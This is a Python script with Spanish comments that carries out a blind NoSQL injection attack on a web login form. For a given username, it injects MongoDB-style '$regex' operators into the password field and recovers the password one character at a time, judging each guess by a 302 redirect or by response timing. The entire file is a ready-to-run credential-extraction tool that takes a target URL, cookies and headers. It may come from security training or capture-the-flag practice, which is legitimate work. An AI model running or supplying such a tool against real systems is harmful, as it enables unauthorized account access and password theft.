import requests
import string
import time
import argparse
import json

# --- Funciones para la conversión de argumentos ---
def parse_dict_arg(arg_string):
    """Convierte una cadena JSON a un diccionario."""
    if arg_string:
        try:
            return json.loads(arg_string)
        except json.JSONDecodeError:
            print("[!] Error al decodificar el argumento de diccionario. Asegúrate de que sea JSON válido.")
            return {}
    return {}

# --- Configuración del parser de argumentos ---
parser = argparse.ArgumentParser(description="Script para realizar un ataque de inyección NoSQL ciego.")
parser.add_argument("-u", "--url", required=True, help="URL del formulario vulnerable (ej: http://ejemplo.com/login.php)")
parser.add_argument("-user", "--usuario", required=True, help="Usuario conocido en la base de datos (ej: 'daniel')")
parser.add_argument("-c", "--cookies", default="{}", help="Cookies en formato JSON (ej: '{\"PHPSESSID\": \"abc123\"}')")
parser.add_argument("-H", "--headers", default="{}", help="Encabezados de la petición en formato JSON (ej: '{\"Content-Type\": \"application/json\"}')")
parser.add_argument("-t", "--threshold", type=float, default=1.5, help="Umbral de tiempo en segundos para el ataque ciego.")

# Analizamos los argumentos de la línea de comandos
args = parser.parse_args()

# Asignamos los argumentos a variables
URL = args.url
USUARIO = args.usuario
cookies = parse_dict_arg(args.cookies)
headers = parse_dict_arg(args.headers)
TIME_THRESHOLD = args.threshold

# Conjunto de caracteres a probar
charset = string.ascii_letters + string.digits

# La contraseña que vamos descubriendo
known_password = ""

print("[*] Iniciando el ataque...")
print(f"[*] URL: {URL}")
print(f"[*] Usuario: {USUARIO}")

while True:
    found = False
    for char in charset:
        attempt = known_password + char
        data = {
            "username[$eq]": USUARIO,
            "password[$regex]": f"^{attempt}.*$"
        }

        start_time = time.time()
        try:
            response = requests.post(URL, headers=headers, cookies=cookies, data=data, allow_redirects=False, timeout=10)
            end_time = time.time()
            elapsed_time = end_time - start_time

            # Lógica 1: Comprobar el código de estado (el método más confiable)
            if response.status_code == 302:
                known_password += char
                print(f"[+] Carácter encontrado (Status Code 302): {char} -> {known_password}")
                found = True
                break

            # Lógica 2: Si el código de estado no funciona, usa el tiempo
            elif elapsed_time > TIME_THRESHOLD:
                known_password += char
                print(f"[+] Carácter encontrado (Tiempo): {char} -> {known_password}")
                found = True
                break
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Error de conexión: {e}")
            break

    if not found:
        print(f"[✓] Contraseña parece haber sido encontrada: {known_password}")
        break

